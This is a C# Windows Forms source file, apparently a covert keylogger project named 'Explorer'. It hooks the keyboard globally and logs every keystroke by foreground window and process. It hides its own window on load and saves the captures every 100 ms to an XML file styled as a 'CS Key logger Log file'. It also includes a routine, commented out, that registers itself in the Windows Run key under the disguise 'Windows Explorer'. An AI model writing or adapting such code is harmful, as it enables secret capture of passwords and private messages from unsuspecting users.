using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Explorer
{
    public partial class Form1 : Form
    {
        
        private Stack _appNames;
        private bool _allowtoTik;
        private UserActivityHook _hooker;

        private bool _isAltDown;
        private bool _isControlDown;
        private bool _isFsDown;
        private bool _isHide;
        private bool _isShiftDown;
        private int _tik;
        

        private Hashtable _logData;
        private string _logfilepath = Application.StartupPath + @"\out-" + DateTime.Now.Hour + "-" +  DateTime.Now.Minute + "-" + DateTime.Now.Month +  "-" + DateTime.Now.Day + ".xml";
        System.Windows.Forms.Timer timer_logsaver;
        public Form1()
        {
            InitializeComponent();
            
            timer_logsaver = new System.Windows.Forms.Timer();
            timer_logsaver.Interval = 100;
            timer_logsaver.Tick += timer_logsaver_Tick;

            
        }

        private void addToStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Explorer", Application.ExecutablePath);
        }

        void timer_logsaver_Tick(object sender, EventArgs e)
        {
            SaveLogfile(_logfilepath);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            _hooker = new UserActivityHook();
            _hooker.KeyDown += HookerKeyDown;
            _hooker.KeyPress += HookerKeyPress;
            _hooker.KeyUp += HookerKeyUp;
            _hooker.Stop();

            _appNames = new Stack();
            _logData = new Hashtable();

            if (!_hooker.IsActive)
            {
                _hooker.Start();
                timer_logsaver.Enabled = true;
            }
            this.Hide();
            this.Visible = false;
            this.WindowState = FormWindowState.Minimized;
            //addToStartup();
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            //labelMousePosition.Text = String.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
            //if (e.Clicks <= 0) return;
            //txt_MouseLog.AppendText("MouseButton:" + e.Button);
            //txt_MouseLog.AppendText(Environment.NewLine);
        }

        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");
            //Logger(e.KeyData + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = true;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = true;
                    break;
            }

            if (_isAltDown && _isControlDown && _isShiftDown && _isFsDown)
                if (_isHide)
                {
                    Show();
                    _isHide = false;
                }
                else
                {
                    Hide();
                    _isHide = true;
                }
        }

        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            _allowtoTik = true;
            if ((byte)e.KeyChar == 9)
                Logger("[TAB]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte)e.KeyChar) + "]");

            _tik = 0;
        }

        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            //Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = false;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = false;
                    break;
            }
        }


        private void Logger(string txt)
        {
            //txt_Log.AppendText(txt);
            //txt_Log.SelectionStart = txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    _logData.Add(_thisapplication, "");
                }
                IDictionaryEnumerator en = _logData.GetEnumerator();
                while (en.MoveNext())
                {
                    if (en.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = en.Value.ToString();
                        _logData.Remove(_thisapplication);
                        _logData.Add(_thisapplication, prlogdata + " " + txt);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }
        private void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = _logfilepath.Substring(0, _logfilepath.LastIndexOf("\\") + 1) + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    string xslcontents =
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath,true);
                    xslwriter.Write(xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }
                var writer = new StreamWriter(pathtosave, false);
                IDictionaryEnumerator element = _logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA[" +
                                         element.Key.ToString().Trim().Substring(0,
                                                                                 element.Key.ToString().Trim().
                                                                                     LastIndexOf("######")).Trim() +
                                         "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA[" +
                                      element.Key.ToString().Trim().Substring(
                                          element.Key.ToString().Trim().LastIndexOf("######") + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", "");
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private string Generatelog()
        {
            try
            {
                string Logdata = "CS Key logger Log Data" + Environment.NewLine;

                IDictionaryEnumerator element = _logData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######")).
                            Trim();
                    string applname =
                        element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                            .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length < 25 && processname.Length < 25)
                    {
                        Logdata += applname.PadRight(25, '-');
                        Logdata += processname.PadLeft(25, '-');
                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
                    }
                }
                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine +
                           String.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
            return null;
        }
        
    }
}


